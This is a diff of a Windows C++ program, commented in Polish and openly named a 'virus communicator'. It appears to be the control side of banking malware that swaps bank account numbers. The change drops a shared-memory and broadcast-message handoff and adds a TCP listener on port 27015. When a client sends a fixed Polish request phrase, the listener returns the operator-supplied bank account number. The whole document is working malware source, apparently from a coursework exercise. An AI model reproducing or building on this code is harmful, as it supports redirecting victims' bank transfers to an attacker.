@@ -1,32 +1,57 @@
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+
 #include <Windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <stdlib.h>
+#include <time.h>
+#pragma comment (lib, "Ws2_32.lib")
+
 #include "resource2.h"
 
-#define REQUEST_NUMBER	0xDEAD
-#define POST_NUMBER		0xBEEF
 #define MAXL			26
 #define MY_BN_CLICKED	1001
+#define DEFAULT_PORT	"27015"
+#define DEAFULT_BUFLEN	512
+#define REQ_CHK_DELAY_S	1.0
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 bool init(HINSTANCE hInstance);
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 void MoveToCb();
-void PostNumber();
+void HandleClient();
+bool init_winsock();
 INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
-void GLEMAS();
 
 constexpr CHAR szClassName[] = "KomunikatorWirusa";
 constexpr CHAR windowTitle[] = "Komunikator Wirusa";
 constexpr CHAR msgName[] = "Nic podejrzanego";
 LPSTR bankAccount;
 HWND hwndThis;
-UINT messageCode;
 bool bAset;
+char sockbuf[DEAFULT_BUFLEN];
+
+SOCKET ListenSocket, ClientSocket;
+struct addrinfo *result = NULL, *ptr = NULL, hints;
+struct sockaddr saClient;
+
+time_t start, current;
+TIMEVAL selectDelay;
+FD_SET read_fd;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	if (!init(hInstance)) return 1;
+	if (!init_winsock()) return 2;
 
+	int iSizeofSaClient = sizeof(saClient);
 	MSG msg;
+
+	FD_SET(ListenSocket, &read_fd);
+	ClientSocket = INVALID_SOCKET;
 
 	while (GetMessage(&msg, NULL, 0, 0) > 0)
 	{
@@ -37,9 +62,35 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 				hwndThis,
 				DialogProc
 			);
+
+		time(&current);
+		double diff = difftime(current, start); // różnica czasu w sekundach
+		if (diff >= REQ_CHK_DELAY_S && ClientSocket == INVALID_SOCKET)
+		{
+			int szSaCl = sizeof(saClient);
+			read_fd.fd_count = 1;
+			int a;
+			int iSelectRet = select(NULL, &read_fd, NULL, NULL, &selectDelay);
+			if (iSelectRet == SOCKET_ERROR)
+				a = WSAGetLastError();
+			if (iSelectRet > 0)
+			{
+				ClientSocket = accept(ListenSocket, &saClient, &szSaCl);
+				if (ClientSocket != INVALID_SOCKET && bAset)
+				{
+					HandleClient();
+				}
+			}
+		}
+		time(&start);
+
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
+
+	closesocket(ListenSocket);
+	closesocket(ClientSocket);
+	WSACleanup();
 	return 0;
 }
 
@@ -79,8 +130,6 @@ bool init(HINSTANCE hInstance)
 
 	if (hwndThis == NULL) return false;
 
-	if (!AddClipboardFormatListener(hwndThis)) return false;
-
 	HWND hwndButton = CreateWindow(
 		"BUTTON",	// Predefined class; Unicode assumed 
 		"Podaj nowy numer konta bankowego", // Button text 
@@ -95,26 +144,68 @@ bool init(HINSTANCE hInstance)
 		NULL		// Pointer not needed.
 	);
 
-	messageCode = RegisterWindowMessage(msgName);
-
 	bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
 	bAset = false;
+
+	selectDelay.tv_sec = 1;
+	selectDelay.tv_usec = 0;
+
+	time(&start);
+	return true;
+}
+
+bool init_winsock()
+{
+	WSADATA wsadata;
+	int iResult;
+	WORD wersja;
+	wersja = MAKEWORD(2, 2);
+	iResult = WSAStartup(wersja, &wsadata);
+	if (iResult != NO_ERROR)
+		return false;
+
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+	hints.ai_flags = AI_PASSIVE;
+
+	// Resolve the local address and port to be used by the server
+	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
+	if (iResult != NO_ERROR)
+		return false;
+
+	// Create a SOCKET for the server to listen for client connections
+	ListenSocket = INVALID_SOCKET;
+	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	if (ListenSocket == INVALID_SOCKET)
+	{
+		freeaddrinfo(result);
+		WSACleanup();
+		return false;
+	}
+
+	// Setup the TCP listening socket
+	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+		freeaddrinfo(result);
+		closesocket(ListenSocket);
+		WSACleanup();
+		return false;
+	}
+	freeaddrinfo(result); // No longer needed
+
+	if (listen(ListenSocket, 2) == SOCKET_ERROR) {
+		closesocket(ListenSocket);
+		WSACleanup();
+		return false;
+	}
 
 	return true;
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
-	if (msg == messageCode)
-	{
-		switch (wParam)
-		{
-		case REQUEST_NUMBER:
-			if (!bAset) break; // Brak konta bankowego do nadpisania
-			PostNumber();
-			break;
-		}
-	} else 
 	switch (msg)
 	{
 	case WM_COMMAND:
@@ -139,40 +230,35 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-void PostNumber()
+void HandleClient()
 {
-	HANDLE hMem = CreateFileMapping(
-		INVALID_HANDLE_VALUE,
-		NULL,
-		PAGE_READWRITE,
-		0,
-		MAXL + 1,
-		"Global\\FM_V"
-		);
-	if (hMem == NULL) GLEMAS();
-	LPCTSTR pBuf = (LPTSTR)MapViewOfFile(
-		hMem,
-		FILE_MAP_ALL_ACCESS,
-		0,
-		0,
-		MAXL + 1
-		);
-	if (pBuf == NULL) GLEMAS();
-	CopyMemory((PVOID)pBuf, bankAccount, (MAXL + 1)*sizeof(CHAR));
+	int sockbuflen = DEAFULT_BUFLEN;
+	ZeroMemory(sockbuf, sockbuflen);
+	int iResult;
 
-	UnmapViewOfFile(pBuf);
-	//CloseHandle(hMem);
+	iResult = recv(ClientSocket, sockbuf, sockbuflen, 0);
+	if (iResult == SOCKET_ERROR && WSAGetLastError() == WSAEMSGSIZE) throw;
+	if (iResult > 0)
+	{
+		if (strcmp(sockbuf, "Dawaj numer konta!") == 0)
+		{
+			strcpy_s(sockbuf, bankAccount);
+			int iSendResult = send(ClientSocket, sockbuf, MAXL + 1, 0);
+			if (iSendResult == SOCKET_ERROR)
+			{
+				closesocket(ClientSocket);
+				return; // error
+			}
+		}
+	}
+	else
+	{
+		closesocket(ClientSocket);
+		return; // error
+	}
 
-	PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, NULL);
-}
-
-void GLEMAS()
-{
-	wchar_t buf[256];
-	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-		NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
-	int i = 0;
+	closesocket(ClientSocket);
+	ClientSocket = INVALID_SOCKET;
 }
 
 INT_PTR CALLBACK DialogProc(HWND hDlg, UINT msg, WPARAM wParam, LPARAM lParam)
